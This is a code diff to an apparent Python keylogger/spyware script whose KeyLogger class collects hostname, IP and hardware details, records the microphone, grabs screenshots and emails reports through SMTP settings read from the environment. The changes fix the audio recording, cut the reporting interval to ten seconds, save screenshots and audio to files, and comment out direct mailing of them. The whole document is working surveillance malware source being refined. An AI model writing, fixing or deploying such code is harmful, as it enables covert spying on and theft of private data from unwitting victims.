@@ -24,7 +24,7 @@ SMTP_SERVER = os.getenv("SMTP_SERVER")
 SMTP_PORT = os.getenv("SMTP_PORT")
 EMAIL_SENDER = os.getenv("EMAIL_SENDER")
 EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
-SEND_REPORT_EVERY = 60  # seconds
+SEND_REPORT_EVERY = 10  # seconds
 
 
 class KeyLogger:
@@ -88,28 +88,33 @@ class KeyLogger:
         processor = platform.processor()
         system = platform.system()
         machine = platform.machine()
-        self.appendlog('hostname = ' + hostname + '\n')
-        self.appendlog('ip = ' + ip + '\n')
-        self.appendlog('processor = ' + processor + '\n')
-        self.appendlog('system = ' + system + '\n')
-        self.appendlog('machine = ' + machine + '\n')
+        self.appendlog("hostname = " + hostname + "\n")
+        self.appendlog("ip = " + ip + "\n")
+        self.appendlog("processor = " + processor + "\n")
+        self.appendlog("system = " + system + "\n")
+        self.appendlog("machine = " + machine + "\n")
 
     def microphone(self):
         fs = 44100
+        channels = 1  # mono
         seconds = SEND_REPORT_EVERY
         obj = wave.open("sound.wav", "w")
-        obj.setnchannels(1)  # mono
-        obj.setsampwidth(2)
+        obj.setnchannels(channels)  # mono
+        obj.setsampwidth(2) # Sampling of 16 bit
         obj.setframerate(fs)
-        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-        obj.writeframesraw(myrecording)
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=channels, dtype='int16')
         sd.wait()
+        obj.writeframesraw(myrecording)
+        self.appendlog("microphone used.\n")
 
-        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
+        # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
 
     def screenshot(self):
         img = pyscreenshot.grab()
-        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
+        img.save("screenshot.png")
+        self.appendlog("screenshot used.\n")
+        
+        # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
 
     def run(self):
         # keyboard_listener = keyboard.Listener(on_press=self.save_data)
@@ -142,6 +147,8 @@ class KeyLogger:
         #         print("File is close.")
 
         self.system_information()
+        # self.screenshot()
+        self.microphone()
         self.report()
 
 
